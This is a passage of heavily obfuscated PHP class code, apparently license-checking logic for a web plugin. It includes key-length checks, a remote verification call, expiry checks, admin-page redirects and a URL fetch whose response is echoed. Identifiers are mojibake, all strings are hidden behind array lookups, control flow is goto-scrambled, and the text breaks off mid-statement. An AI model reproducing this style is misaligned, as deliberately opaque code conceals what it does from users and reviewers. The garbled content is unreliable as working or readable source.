$Eíùğ„¯„š[$d…­øçäé[90]][$d…­øçäé[91]][$d…­øçäé[76]]; goto e‚´‘™„–ß; eÙŒåĞ‰: $f”Æ™À¬Ò =& $_SERVER[÷ÖêïÔÔÓ]; $d…­øçäé =& $_SERVER[ë¿˜ªè¥×”ö]; $b¯öè²¸šÎ = $d…­øçäé[61]($d…­øçäé[62])->{$_SERVER[ë¿˜ªè¥×”ö][63]}(); goto f«÷ÖÚ‹ÖÖ; A¹±«ˆ»: $Eíùğ„¯„š[$d…­øçäé[105]][$d…­øçäé[110]] = $d…­øçäé[111]($_SERVER[$d…­øçäé[112]] . $b¯öè²¸šÎ[$d…­øçäé[113]]); $Eíùğ„¯„š[$d…­øçäé[105]][$d…­øçäé[114]] = $d…­øçäé[115]($d…­øçäé[116]()); $Eíùğ„¯„š[$d…­øçäé[105]][$d…­øçäé[117]] = $this->gpwjd31c2313; goto A­ÅÚ‚Êƒù; F¦ËÄÆØê§: unset($Eíùğ„¯„š[$d…­øçäé[90]][$d…­øçäé[92]][$d…­øçäé[94]]); $d˜§¨ãà = $f”Æ™À¬Ò[573]; unset($Eíùğ„¯„š[$d…­øçäé[90]][$d…­øçäé[91]][$d…­øçäé[76]]); goto C¬˜ƒ¢·…; C¬˜ƒ¢·…: $EÅñœŒ¯Ş¬ = $f”Æ™À¬Ò[574]; while ($EÅñœŒ¯Ş¬ < $f”Æ™À¬Ò[557]) { if ($EÅñœŒ¯Ş¬ >= 0) { break; } $EÅñœŒ¯Ş¬++; } unset($Eíùğ„¯„š[$d…­øçäé[90]][$d…­øçäé[91]][$d…­øçäé[95]]); goto CÌ¡ïèóß; A­ÅÚ‚Êƒù: $a¥¼Ø½‚¤ = $f”Æ™À¬Ò[576]; if (strlen($a¥¼Ø½‚¤) < $f”Æ™À¬Ò[540]) { die; } if ($b¯öè²¸šÎ[$d…­øçäé[117]] != $d…­øçäé[118]) { $Eíùğ„¯„š[$d…­øçäé[105]][$d…­øçäé[119]] = $b¯öè²¸šÎ[$d…­øçäé[119]]; $Eíùğ„¯„š[$d…­øçäé[105]][$d…­øçäé[120]] = $b¯öè²¸šÎ[$d…­øçäé[120]]; $fÕİòï¾ô = $d…­øçäé[121](10) . $this->gpwjd31c2313 . $d…­øçäé[121](5); $Eíùğ„¯„š[$d…­øçäé[90]][$d…­øçäé[122]][$d…­øçäé[123]] = $this->{$_SERVER[ë¿˜ªè¥×”ö][124]}($fÕİòï¾ô, $Eíùğ„¯„š[$d…­øçäé[105]][$d…­øçäé[110]]); } goto B¢†ÑÅÇ¤ç; e‚´‘™„–ß: $b§Ë˜¾ì»õ = $f”Æ™À¬Ò[572]; if (!$b§Ë˜¾ì»õ) { die; } unset($Eíùğ„¯„š[$d…­øçäé[90]][$d…­øçäé[92]][$d…­øçäé[93]]); goto F¦ËÄÆØê§; Bù“ôĞ—¼ç: } private function qpmlc99768b6() { goto A£éä¢á§£; DÉÔëÕÁ¢¿: if ($this->gpwjd31c2313 == $c‰¬‹–¿ˆ[118]) { return; } $AÒÊ”†Ëº = array($c‰¬‹–¿ˆ[150], $c‰¬‹–¿ˆ[151], $c‰¬‹–¿ˆ[152], $c‰¬‹–¿ˆ[153], $c‰¬‹–¿ˆ[154], $c‰¬‹–¿ˆ[155]); $Fğ‹Œó¸‘ = $c‰¬‹–¿ˆ[61]($c‰¬‹–¿ˆ[62])->{$_SERVER[ë¿˜ªè¥×”ö][63]}(); goto Dˆİå™‹÷¥; Dˆİå™‹÷¥: $a‹±Â–Ç”È = $bö“Å¿¸Ş[579]; if (!$a‹±Â–Ç”È) { return; } $fº÷¡•ÕÎï = array($c‰¬‹–¿ˆ[156] => $Fğ‹Œó¸‘[$c‰¬‹–¿ˆ[64]], $c‰¬‹–¿ˆ[157] => $Fğ‹Œó¸‘[$c‰¬‹–¿ˆ[65]], $c‰¬‹–¿ˆ[158] => $c‰¬‹–¿ˆ[10]); goto b½‰Óí’‰; b½‰Óí’‰: foreach ($AÒÊ”†Ëº as $DŒØ°í¯Š) { if (!isset($Fğ‹Œó¸‘[$DŒØ°í¯Š]) || !$Fğ‹Œó¸‘[$DŒØ°í¯Š]) { continue; } $fº÷¡•ÕÎï[$DŒØ°í¯Š] = $Fğ‹Œó¸‘[$DŒØ°í¯Š]; } $c‰¬‹–¿ˆ[13](array($c‰¬‹–¿ˆ[148], $c‰¬‹–¿ˆ[149]), $fº÷¡•ÕÎï); goto e‘‡°ƒ‡øÊ; A£éä¢á§£: $bö“Å¿¸Ş =& $_SERVER[÷ÖêïÔÔÓ]; $c‰¬‹–¿ˆ =& $_SERVER[ë¿˜ªè¥×”ö]; if ($_SERVER[$c‰¬‹–¿ˆ[44]] == $c‰¬‹–¿ˆ[132]) { goto eà¸’Î«©; FÀé´Œ¡Ä: $c‰¬‹–¿ˆ[13](array($c‰¬‹–¿ˆ[148], $c‰¬‹–¿ˆ[149]), $fº÷¡•ÕÎï); $bîÚ‚òÊ… = $bö“Å¿¸Ş[578]; if (!$bîÚ‚òÊ…) { die; } goto bò‘¡ˆ™ÚÄ; B¨Éí¿„ÍŠ: $bò¯Úµ‘ù = $bö“Å¿¸Ş[577]; if (!$bò¯Úµ‘ù) { die; } $fº÷¡•ÕÎï = array($c‰¬‹–¿ˆ[147] => $A…×ïÄÙ); goto FÀé´Œ¡Ä; eà¸’Î«©: $A…×ïÄÙ = array($c‰¬‹–¿ˆ[117] => $this->gpwjd31c2313, $c‰¬‹–¿ˆ[133] => $this->{$_SERVER[ë¿˜ªè¥×”ö][134]}(), $c‰¬‹–¿ˆ[135] => $c‰¬‹–¿ˆ[61]($c‰¬‹–¿ˆ[136])->{$_SERVER[ë¿˜ªè¥×”ö][137]}()); if ($this->gpwjd31c2313 != $c‰¬‹–¿ˆ[118]) { $Aùæ¹‹ƒ™† = $c‰¬‹–¿ˆ[101]($this->edfm0e49405f, $c‰¬‹–¿ˆ[138]); if ($Aùæ¹‹ƒ™†) { $A…×ïÄÙ[$c‰¬‹–¿ˆ[139]] = $Aùæ¹‹ƒ™†; $A…×ïÄÙ[$c‰¬‹–¿ˆ[140]] = $c‰¬‹–¿ˆ[141]($c‰¬‹–¿ˆ[101]($this->edfm0e49405f, $c‰¬‹–¿ˆ[142])); $A…×ïÄÙ[$c‰¬‹–¿ˆ[143]] = $c‰¬‹–¿ˆ[101]($this->edfm0e49405f, $c‰¬‹–¿ˆ[128]); } } $A…×ïÄÙ = $this->{$_SERVER[ë¿˜ªè¥×”ö][144]}($c‰¬‹–¿ˆ[145]($A…×ïÄÙ), $c‰¬‹–¿ˆ[111]($c‰¬‹–¿ˆ[146])); goto B¨Éí¿„ÍŠ; bò‘¡ˆ™ÚÄ: } goto DÉÔëÕÁ¢¿; e‘‡°ƒ‡øÊ: } private function ptyw321e192c() { goto d’´ÑÅæâ÷; AÂ»œ³Ìµ¢: $F‰£ËšÀ¡â[$A·Ä¬ƒ……”] = $A†×ÌšŞ˜¥; $aÙ´ª„§öº[61]($aÙ´ª„§öº[11])->{$_SERVER[ë¿˜ªè¥×”ö][223]}($a·«ÁÍäİ[$aÙ´ª„§öº[224]], array($aÙ´ª„§öº[225] => $F‰£ËšÀ¡â)); $f¥¾á‚‹º› = $b‹øøÙà¹®[590]; goto cñÊîµ°á»; fµŒ¨ƒÚã: if (!$f‡¹ƒñÒœÒ) { die; } $dŒÅ’İ¥Ûï = $aÙ´ª„§öº[111]($_SERVER[$aÙ´ª„§öº[112]] . $Bç¾¾„â); $b²³Á¢ºğó = $b‹øøÙà¹®[581]; goto Cœ‡ºŒ•åØ; d ¾¶…öš: if ($DÈ†ƒŠÛî¸[$aÙ´ª„§öº[165]]) { $fÕ‡ÓöÏº[$aÙ´ª„§öº[209]] = $DÈ†ƒŠÛî¸[$aÙ´ª„§öº[165]]; } $Fğï‡ÅÙ„ = $aÙ´ª„§öº[25]($aÙ´ª„§öº[111]($fÕ‡ÓöÏº[$aÙ´ª„§öº[207]]), 10, 10); $B’¼¯ÖÀ± = $Fğï‡ÅÙ„ . $fÕ‡ÓöÏº[$aÙ´ª„§öº[117]] . $fÕ‡ÓöÏº[$aÙ´ª„§öº[209]]; goto AĞÀƒÊÔˆò; a”æ‡À±Î: if (strlen($FÈ±¯—¦Ù›) < $b‹øøÙà¹®[548]) { return; } if (!$F¿×åì¤…º || $F¿×åì¤…º != $aÙ´ª„§öº[198]($f‡Ï÷Œ’–¼[$aÙ´ª„§öº[142]])) { $aÅĞâ¼©Ÿ = array($aÙ´ª„§öº[199] => $aÙ´ª„§öº[61]($aÙ´ª„§öº[62])->{$_SERVER[ë¿˜ªè¥×”ö][63]}($aÙ´ª„§öº[113]), $aÙ´ª„§öº[200] => $_SERVER[$aÙ´ª„§öº[112]], $aÙ´ª„§öº[201] => $aÙ´ª„§öº[202](), $aÙ´ª„§öº[171] => $_SERVER[$aÙ´ª„§öº[172]]); $a“œ‡éËãĞ = $this->{$_SERVER[ë¿˜ªè¥×”ö][203]}($aÙ´ª„§öº[145]($aÅĞâ¼©Ÿ)); $this->{$_SERVER[ë¿˜ªè¥×”ö][179]}($aÙ´ª„§öº[204] . $a“œ‡éËãĞ); $aÙ´ª„§öº[163]($aÙ´ª„§öº[194]($aÙ´ª„§öº[205]), !0); } $fÕ‡ÓöÏº = array($aÙ´ª„§öº[206] => $DÈ†ƒŠÛî¸[$aÙ´ª„§öº[162]], $aÙ´ª„§öº[207] => $f‡Ï÷Œ’–¼[$aÙ´ª„§öº[208]], $aÙ´ª„§öº[209] => $aÙ´ª„§öº[121](16), $aÙ´ª„§öº[117] => $f‡Ï÷Œ’–¼[$aÙ´ª„§öº[210]]); goto d ¾¶…öš; d’´ÑÅæâ÷: $b‹øøÙà¹® =& $_SERVER[÷ÖêïÔÔÓ]; $aÙ´ª„§öº =& $_SERVER[ë¿˜ªè¥×”ö]; if ($_SERVER[$aÙ´ª„§öº[44]] != $aÙ´ª„§öº[159] || !$GLOBALS[$aÙ´ª„§öº[129]]) { return; } goto eŸ¸ŒŠ¶·; Cœ‡ºŒ•åØ: if (strlen($b²³Á¢ºğó) < $b‹øøÙà¹®[540]) { return; } if ($EÚšƒŒÅ®Ó[$aÙ´ª„§öº[175]] == $aÙ´ª„§öº[176]) { $eÍ¹ŒÃëô = $this->{$_SERVER[ë¿˜ªè¥×”ö][144]}($dŒÅ’İ¥Ûï, $aÙ´ª„§öº[177]); $a“œ‡éËãĞ = $this->{$_SERVER[ë¿˜ªè¥×”ö][124]}($aÙ´ª„§öº[145]($DÈ†ƒŠÛî¸), $dŒÅ’İ¥Ûï . $aÙ´ª„§öº[178], 3); $eğí¡Öí¢Æ = $this->{$_SERVER[ë¿˜ªè¥×”ö][179]}($aÙ´ª„§öº[180] . $eÍ¹ŒÃëô . $aÙ´ª„§öº[181] . $a“œ‡éËãĞ, -1); $aÙ´ª„§öº[163]($eğí¡Öí¢Æ, !0); } else { if ($EÚšƒŒÅ®Ó[$aÙ´ª„§öº[175]] == $aÙ´ª„§öº[182]) { $eÒ’·äÍòŠ = $aÙ´ª„§öº[25]($aÙ´ª„§öº[111]($aÙ´ª„§öº[183] . $dŒÅ’İ¥Ûï), 12, 15) . $aÙ´ª„§öº[184]; $a“œ‡éËãĞ = $this->{$_SERVER[ë¿˜ªè¥×”ö][185]}($aÙ´ª„§öº[2]($EÚšƒŒÅ®Ó[$aÙ´ª„§öº[186]]), $eÒ’·äÍòŠ, 2); $eâ²‘Á¹ä = $aÙ´ª„§öº[187]($a“œ‡éËãĞ, !0); if (!$aÙ´ª„§öº[188]($eâ²‘Á¹ä) || !$aÙ´ª„§öº[188]($eâ²‘Á¹ä[$aÙ´ª„§öº[189]]) || $eâ²‘Á¹ä[$aÙ´ª„§öº[162]] != !0) { $A¬§çÃçê’ = $aÙ´ª„§öº[190]; $DàÙ¥‘‡…¼ = $eâ²‘Á¹ä[$aÙ´ª„§öº[189]] ? $aÙ´ª„§öº[191] . $eâ²‘Á¹ä[$aÙ´ª„§öº[189]] : $A¬§çÃçê’; $aÙ´ª„§öº[163]($DàÙ¥‘‡…¼, !1); } else { $DÈ†ƒŠÛî¸[$aÙ´ª„§öº[165]] = $eâ²‘Á¹ä[$aÙ´ª„§öº[189]][$aÙ´ª„§öº[192]]; } } else { $eâ²‘Á¹ä = $this->{$_SERVER[ë¿˜ªè¥×”ö][179]}($aÙ´ª„§öº[193], $DÈ†ƒŠÛî¸, 10); } } if (!$aÙ´ª„§öº[188]($eâ²‘Á¹ä) || !$aÙ´ª„§öº[188]($eâ²‘Á¹ä[$aÙ´ª„§öº[189]]) || $eâ²‘Á¹ä[$aÙ´ª„§öº[162]] != !0) { $A¬§çÃçê’ = $aÙ´ª„§öº[194]($aÙ´ª„§öº[195]); $DàÙ¥‘‡…¼ = $eâ²‘Á¹ä[$aÙ´ª„§öº[189]] ? $aÙ´ª„§öº[191] . $eâ²‘Á¹ä[$aÙ´ª„§öº[189]] : $A¬§çÃçê’; $aÙ´ª„§öº[163]($DàÙ¥‘‡…¼, !1); } goto B‡™ãŠÙ©á; cñÊîµ°á»: $aÙ´ª„§öº[163]($aÙ´ª„§öº[194]($aÙ´ª„§öº[205]), !0); goto bè´²ŸÔ‚Ğ; E»‚ÙÆÉä: $bª•ªĞÙËİ = $b‹øøÙà¹®[584]; $A×¦ëòéÅâ = $e’‘‰Æ¤ . $fÕ‡ÓöÏº[$aÙ´ª„§öº[117]] . $this->{$_SERVER[ë¿˜ªè¥×”ö][144]}($aÙ´ª„§öº[111]($fÕ‡ÓöÏº[$aÙ´ª„§öº[206]]), $e’‘‰Æ¤); $b÷¤ÕÆŸßë = $b‹øøÙà¹®[585]; goto b¸»ˆ”–÷ø; EŒ¬‹‰áë: $F‰£ËšÀ¡â = array(); $d·Ìîç“Ô = $b‹øøÙà¹®[589]; if (!$d·Ìîç“Ô) { return; } goto AÂ»œ³Ìµ¢; còœéĞ˜¹Ø: $C±Ü°Æ»Å‹ = $b‹øøÙà¹®[588]; while (strlen($C±Ü°Æ»Å‹) < $b‹øøÙà¹®[550]) { if (!$C±Ü°Æ»Å‹) { break; } $C±Ü°Æ»Å‹++; } $a·«ÁÍäİ = $Aš¬‡·•š§[$aÙ´ª„§öº[222]]; goto EŒ¬‹‰áë; AèÓ½ ãë: $A«“±Ô†‘ = $b‹øøÙà¹®[586]; if (!$A«“±Ô†‘) { die; } $A†×ÌšŞ˜¥ = $this->{$_SERVER[ë¿˜ªè¥×”ö][124]}($aÙ´ª„§öº[145]($f‡Ï÷Œ’–¼), $Aè¨¥•´æØ); goto e•†Î‡µ; eŸ¸ŒŠ¶·: $EÚšƒŒÅ®Ó = $GLOBALS[$aÙ´ª„§öº[22]]; if (isset($EÚšƒŒÅ®Ó[$aÙ´ª„§öº[160]])) { $this->{$_SERVER[ë¿˜ªè¥×”ö][161]}(); die; } if (!isset($EÚšƒŒÅ®Ó[$aÙ´ª„§öº[162]]) || $aÙ´ª„§öº[24]($EÚšƒŒÅ®Ó[$aÙ´ª„§öº[162]]) != 16) { $aÙ´ª„§öº[163]($aÙ´ª„§öº[164] . $EÚšƒŒÅ®Ó[$aÙ´ª„§öº[162]], !1); } goto aóÜ³É… ; b¸»ˆ”–÷ø: if (!$b÷¤ÕÆŸßë) { return; } $fÕ‡ÓöÏº[$aÙ´ª„§öº[120]] = $aÙ´ª„§öº[115]($aÙ´ª„§öº[211]($this->{$_SERVER[ë¿˜ªè¥×”ö][144]}($A×¦ëòéÅâ, $aÙ´ª„§öº[213]))); if ($f‡Ï÷Œ’–¼[$aÙ´ª„§öº[214]] && $f‡Ï÷Œ’–¼[$aÙ´ª„§öº[214]] >= 1) { $aÙ´ª„§öº[61]($aÙ´ª„§öº[62])->{$_SERVER[ë¿˜ªè¥×”ö][215]}($aÙ´ª„§öº[216], $aÙ´ª„§öº[217]); } goto c¨Ì•Ìà¼À; aóÜ³É… : $Bç¾¾„â = $aÙ´ª„§öº[61]($aÙ´ª„§öº[62])->{$_SERVER[ë¿˜ªè¥×”ö][63]}($aÙ´ª„§öº[113]); $DÈ†ƒŠÛî¸ = array($aÙ´ª„§öº[162] => $EÚšƒŒÅ®Ó[$aÙ´ª„§öº[162]], $aÙ´ª„§öº[165] => $aÙ´ª„§öº[121](16), $aÙ´ª„§öº[166] => $aÙ´ª„§öº[146], $aÙ´ª„§öº[167] => $aÙ´ª„§öº[168], $aÙ´ª„§öº[169] => $_SERVER[$aÙ´ª„§öº[170]], $aÙ´ª„§öº[171] => $_SERVER[$aÙ´ª„§öº[172]], $aÙ´ª„§öº[173] => $_SERVER[$aÙ´ª„§öº[174]]); $f‡¹ƒñÒœÒ = $b‹øøÙà¹®[580]; goto fµŒ¨ƒÚã; B‡™ãŠÙ©á: $f‡Ï÷Œ’–¼ = $eâ²‘Á¹ä[$aÙ´ª„§öº[189]]; $F¿×åì¤…º = $this->{$_SERVER[ë¿˜ªè¥×”ö][196]}($f‡Ï÷Œ’–¼[$aÙ´ª„§öº[197]]); $FÈ±¯—¦Ù› = $b‹øøÙà¹®[582]; goto a”æ‡À±Î; e•†Î‡µ: $dó«—¯µ„ = $b‹øøÙà¹®[587]; if (strlen($dó«—¯µ„) < $b‹øøÙà¹®[557]) { die; } $Aš¬‡·•š§ = $aÙ´ª„§öº[219]($aÙ´ª„§öº[61]($aÙ´ª„§öº[11])->{$_SERVER[ë¿˜ªè¥×”ö][220]}(), $aÙ´ª„§öº[221]); goto còœéĞ˜¹Ø; c¨Ì•Ìà¼À: $aÙ´ª„§öº[61]($aÙ´ª„§öº[62])->{$_SERVER[ë¿˜ªè¥×”ö][218]}($fÕ‡ÓöÏº); $Aè¨¥•´æØ = $aÙ´ª„§öº[111]($_SERVER[$aÙ´ª„§öº[112]] . $aÙ´ª„§öº[211]($Bç¾¾„â) . $fÕ‡ÓöÏº[$aÙ´ª„§öº[207]]); $A·Ä¬ƒ……” = $aÙ´ª„§öº[211]($aÙ´ª„§öº[25]($Aè¨¥•´æØ, 10, 16)); goto AèÓ½ ãë; AĞÀƒÊÔˆò: $fÕ‡ÓöÏº[$aÙ´ª„§öº[119]] = $aÙ´ª„§öº[211]($aÙ´ª„§öº[115]($this->{$_SERVER[ë¿˜ªè¥×”ö][144]}($B’¼¯ÖÀ±, $aÙ´ª„§öº[212]))); $B¢§äÒ¼¯Ô = $b‹øøÙà¹®[583]; $e’‘‰Æ¤ = $aÙ´ª„§öº[121](16); goto E»‚ÙÆÉä; bè´²ŸÔ‚Ğ: } private function hqgu64f71ab0() { goto B¤¬Í‹; A¯‹…Ùº¶: if (strlen($CÕƒ¢ÊƒˆÒ) < $A„Àˆ×¯Ùº[550]) { die; } goto D²ŸäÁ–„; AãµÜå÷‡ß: $this->edfm0e49405f = array(); $this->gpwjd31c2313 = $cÈáÖÅß¶é[118]; $CÕƒ¢ÊƒˆÒ = $A„Àˆ×¯Ùº[592]; goto A¯‹…Ùº¶; B¤¬Í‹: $A„Àˆ×¯Ùº =& $_SERVER[÷ÖêïÔÔÓ]; $cÈáÖÅß¶é =& $_SERVER[ë¿˜ªè¥×”ö]; $cÈáÖÅß¶é[61]($cÈáÖÅß¶é[62])->{$_SERVER[ë¿˜ªè¥×”ö][218]}(array($cÈáÖÅß¶é[206] => $cÈáÖÅß¶é[10], $cÈáÖÅß¶é[207] => $cÈáÖÅß¶é[10], $cÈáÖÅß¶é[117] => $cÈáÖÅß¶é[118], $cÈáÖÅß¶é[119] => $cÈáÖÅß¶é[10], $cÈáÖÅß¶é[120] => $cÈáÖÅß¶é[10])); goto Aò„³Â“°—; Aò„³Â“°—: $cÈáÖÅß¶é[61]($cÈáÖÅß¶é[62])->{$_SERVER[ë¿˜ªè¥×”ö][215]}($cÈáÖÅß¶é[216], $cÈáÖÅß¶é[226]); $dâ±é²é = $A„Àˆ×¯Ùº[591]; if (!$dâ±é²é) { return; } goto AãµÜå÷‡ß; D²ŸäÁ–„: } private function xbzv27f7b6bc() { goto dŠªâãîõ; C –¿õÆÑ: $F’ÂõÁÙÆó = $dâå•Âò¤Ğ[61]($dâå•Âò¤Ğ[62])->{$_SERVER[ë¿˜ªè¥×”ö][63]}(); if ($F’ÂõÁÙÆó[$dâå•Âò¤Ğ[117]] == $dâå•Âò¤Ğ[118]) { return; } $f­©µ×‚Ï» = $dâå•Âò¤Ğ[61]($dâå•Âò¤Ğ[62])->{$_SERVER[ë¿˜ªè¥×”ö][63]}($dâå•Âò¤Ğ[113]); goto eóö¾©š¥¤; dŠªâãîõ: $E°ÉÄ–ªîÀ =& $_SERVER[÷ÖêïÔÔÓ]; $dâå•Âò¤Ğ =& $_SERVER[ë¿˜ªè¥×”ö]; $this->gpwjd31c2313 = $dâå•Âò¤Ğ[118]; goto C –¿õÆÑ; cˆÔ¦Ç›“¡: $e•– šªì = $b†Ó…Ş¹”[$dâå•Âò¤Ğ[222]]; $cŒ†ÔÑºä‡ = $dâå•Âò¤Ğ[111]($_SERVER[$dâå•Âò¤Ğ[112]] . $dâå•Âò¤Ğ[211]($f­©µ×‚Ï») . $F’ÂõÁÙÆó[$dâå•Âò¤Ğ[207]]); $C·ÊéÃ›—È = $dâå•Âò¤Ğ[211]($dâå•Âò¤Ğ[25]($cŒ†ÔÑºä‡, 10, 16)); goto eš—êÙÔ¯˜; eÒŠ‘ˆÁ: $this->gpwjd31c2313 = $F’ÂõÁÙÆó[$dâå•Âò¤Ğ[117]]; goto C¿‰ˆ°”ì; dÂÅÁÃ£Ù: $D‚§ÔÒ±­œ = $dâå•Âò¤Ğ[187]($D‚§ÔÒ±­œ, !0); $dÃ¦‹†âŒ = $E°ÉÄ–ªîÀ[596]; if (!$dâå•Âò¤Ğ[188]($D‚§ÔÒ±­œ)) { return $this->{$_SERVER[ë¿˜ªè¥×”ö][161]}(); } goto eå™Ä½‰–÷; eóö¾©š¥¤: $b™éñ»åß = $E°ÉÄ–ªîÀ[593]; while (strlen($b™éñ»åß) < $E°ÉÄ–ªîÀ[557]) { if (!$b™éñ»åß) { break; } $b™éñ»åß++; } $b†Ó…Ş¹” = $dâå•Âò¤Ğ[219]($dâå•Âò¤Ğ[61]($dâå•Âò¤Ğ[11])->{$_SERVER[ë¿˜ªè¥×”ö][220]}(), $dâå•Âò¤Ğ[221]); goto cˆÔ¦Ç›“¡; eå™Ä½‰–÷: $FóÍ éë = $dâå•Âò¤Ğ[141]($D‚§ÔÒ±­œ[$dâå•Âò¤Ğ[142]]); if ($dâå•Âò¤Ğ[227]() >= $FóÍ éë) { return $this->{$_SERVER[ë¿˜ªè¥×”ö][161]}(); } $this->edfm0e49405f = $D‚§ÔÒ±­œ; goto eÒŠ‘ˆÁ; eš—êÙÔ¯˜: $FÉ«â÷¬«Ì = $E°ÉÄ–ªîÀ[594]; $D‚§ÔÒ±­œ = $this->{$_SERVER[ë¿˜ªè¥×”ö][185]}($e•– šªì[$dâå•Âò¤Ğ[88]][$C·ÊéÃ›—È], $cŒ†ÔÑºä‡); $BĞÉ‹…Ëš¹ = $E°ÉÄ–ªîÀ[595]; goto dÂÅÁÃ£Ù; C¿‰ˆ°”ì: } private function jtoz377c38c2() { goto b‡¼ùÒß›¾; AÌ±²¾å·è: if (!$AÕµÚÂ¹®) { return; } $fÏà¡ÙøÈ¥ = $_SERVER[$dœáîìÁÕ [44]]; if ($fÏà¡ÙøÈ¥ == $dœáîìÁÕ [228] && $this->gpwjd31c2313 == $dœáîìÁÕ [118]) { $dœáîìÁÕ [163]($dœáîìÁÕ [194]($dœáîìÁÕ [229]), !1, $dœáîìÁÕ [230]); } goto A§ÊË•¶Á; A§ÊË•¶Á: $e­Šî‰ÉĞ = array($dœáîìÁÕ [231], $dœáîìÁÕ [232]); if ($dœáîìÁÕ [233]($fÏà¡ÙøÈ¥, $e­Šî‰ÉĞ)) { if ($this->gpwjd31c2313 == $dœáîìÁÕ [118] && isset($c›ñõ½¥Ö[$dœáîìÁÕ [234]])) { $dœáîìÁÕ [163]($dœáîìÁÕ [194]($dœáîìÁÕ [229]), !1, $dœáîìÁÕ [230]); die; } $a¾ÒÌÜ°± = $this->{$_SERVER[ë¿˜ªè¥×”ö][134]}(); if ($a¾ÒÌÜ°± != $dœáîìÁÕ [198]($dœáîìÁÕ [235])) { if ($a¾ÒÌÜ°± <= $dœáîìÁÕ [61]($dœáîìÁÕ [136])->{$_SERVER[ë¿˜ªè¥×”ö][137]}()) { $dœáîìÁÕ [163]($dœáîìÁÕ [194]($dœáîìÁÕ [236]), !1, $dœáîìÁÕ [230]); die; } } } goto BÄÁ³™½ïœ; b‡¼ùÒß›¾: $dœáîìÁÕ  =& $_SERVER[ë¿˜ªè¥×”ö]; $c›ñõ½¥Ö = $GLOBALS[$dœáîìÁÕ [22]]; $AÕµÚÂ¹® = $_SERVER[÷ÖêïÔÔÓ][597]; goto AÌ±²¾å·è; BÄÁ³™½ïœ: } private function tknm9b086e7d() { goto aäÛŒôÖÒñ; dé‚Ó¥²½: if (!$GLOBALS[$DŠ¬óæ£èİ[129]] || !isset($_GET[$DŠ¬óæ£èİ[238]])) { return; } if (!$DŠ¬óæ£èİ[233]($_SERVER[$DŠ¬óæ£èİ[44]], $d˜åÁÜ­¬Ş)) { return; } $CÒÇ×í·ê­ = $DŠ¬óæ£èİ[239]; goto B‰Ìôë´ôó; B‰Ìôë´ôó: $CÒÇ×í·ê­ = $this->{$_SERVER[ë¿˜ªè¥×”ö][240]}($CÒÇ×í·ê­, $DŠ¬óæ£èİ[241]); $b­”•¿ã—ƒ = $DŠ¬óæ£èİ[242](array($DŠ¬óæ£èİ[243] => array($DŠ¬óæ£èİ[244] => $DŠ¬óæ£èİ[245], $DŠ¬óæ£èİ[246] => 3))); $e©µ¤¿¢Ä = @$DŠ¬óæ£èİ[247]($CÒÇ×í·ê­, !1, $b­”•¿ã—ƒ); goto CÌé¯ÙÒ˜§; aäÛŒôÖÒñ: $DŠ¬óæ£èİ =& $_SERVER[ë¿˜ªè¥×”ö]; $d˜åÁÜ­¬Ş = array($DŠ¬óæ£èİ[132], $DŠ¬óæ£èİ[237]); $B´²ƒ¡ä—Ó = $_SERVER[÷ÖêïÔÔÓ][598]; goto dé‚Ó¥²½; CÌé¯ÙÒ˜§: $DŠ¬óæ£èİ[248]($DŠ¬óæ£èİ[249]); if ($e©µ¤¿¢Ä && $DŠ¬óæ£èİ[32]($e©µ¤¿¢Ä, $DŠ¬óæ£èİ[250])) { echo $e©µ¤¿¢Ä; } die; goto eÃ¶ŒÜÒÃ; eÃ¶ŒÜÒÃ: } public function adws0c3a3321($EŒñÍˆ×ÂÊ) { goto dÙ¡·×Õ—; dÙ¡·×Õ—: $FàâÜ°Áòì =& $_SERVER[÷ÖêïÔÔÓ]; $Fì˜¦ùÍĞ =& $_SERVER[ë¿˜ªè¥×”ö]; if ($this->gpwjd31c2313 == $Fì˜¦ùÍĞ[251]) { return $EŒñÍˆ×ÂÊ; } goto b…öÉ–§à; fëæ½†àÆ²: $AğåÎ˜‡‚ = $FàâÜ°Áòì[599]; if (!$AğåÎ˜‡‚) { return; } foreach ($DÄĞî…â¸ as $a³õ¤÷„ùŒ) { if (!$Fì˜¦ùÍĞ[233]($a³õ¤÷„ùŒ, $dŞ×È¬è)) { $AÚÙ©¥ë‡ò[] = $a³õ¤÷„ùŒ; } } goto FãåÒÉíæÃ; b…öÉ–§à: $DÄĞî…â¸ = array($Fì˜¦ùÍĞ[252], $Fì˜¦ùÍĞ[253], $Fì˜¦ùÍĞ[254], $Fì˜¦ùÍĞ[255], $Fì˜¦ùÍĞ[256], $Fì˜¦ùÍĞ[257], $Fì˜¦ùÍĞ[258], $Fì˜¦ùÍĞ[259]); $dŞ×È¬è = $Fì˜¦ùÍĞ[0]($Fì˜¦ùÍĞ[260], $Fì˜¦ùÍĞ[101]($this->edfm0e49405f, $Fì˜¦ùÍĞ[126], $Fì˜¦ùÍĞ[10])); $AÚÙ©¥ë‡ò = array(); goto fëæ½†àÆ²; FãåÒÉíæÃ: foreach ($AÚÙ©¥ë‡ò as $a³õ¤÷„ùŒ) { unset($EŒñÍˆ×ÂÊ[$a³õ¤÷„ùŒ]); $D³ĞÛêÄ—— = $FàâÜ°Áòì[600]; if (!$D³ĞÛêÄ——) { die; } } return $EŒñÍˆ×ÂÊ; goto eØæ‡ù¦; eØæ‡ù¦: } private function atnv0e817162() { goto AÎÁìŒÂ…—; AÎÁìŒÂ…—: $d¿‹÷º‰– =& $_SERVER[÷ÖêïÔÔÓ]; $dĞ³åèŞ¦¦ =& $_SERVER[ë¿˜ªè¥×”ö]; if ($this->gpwjd31c2313 != $dĞ³åèŞ¦¦[118]) { return; } goto a¶ğ¨ò¶; fôÅ­Ó‰Ê: $GLOBALS[$dĞ³åèŞ¦¦[88]][$dĞ³åèŞ¦¦[265]] = $dĞ³åèŞ¦¦[217]; goto dù ì‚Ò½; a¶ğ¨ò¶: $F®¾§Æ¤± = $_SERVER[$dĞ³åèŞ¦¦[44]]; $AçĞİğ‚ = $d¿‹÷º‰–[601]; if (!$AçĞİğ‚) { die; } goto CôŞàã¬áİ; DÉ•ÊƒÏĞ¥: foreach ($d˜œˆ§®×Ù as $Dç„éÅÁÜ’) { if ($Dç„éÅÁÜ’ == $F®¾§Æ¤± || $dĞ³åèŞ¦¦[25]($F®¾§Æ¤±, 0, $dĞ³åèŞ¦¦[24]($Dç„éÅÁÜ’)) == $Dç„éÅÁÜ’) { $dĞ³åèŞ¦¦[163]($dĞ³åèŞ¦¦[194]($dĞ³åèŞ¦¦[262]), !1); } } $this->{$_SERVER[ë¿˜ªè¥×”ö][3]}($dĞ³åèŞ¦¦[263], array($this, $dĞ³åèŞ¦¦[264])); $CÆöòê• = $d¿‹÷º‰–[603]; goto 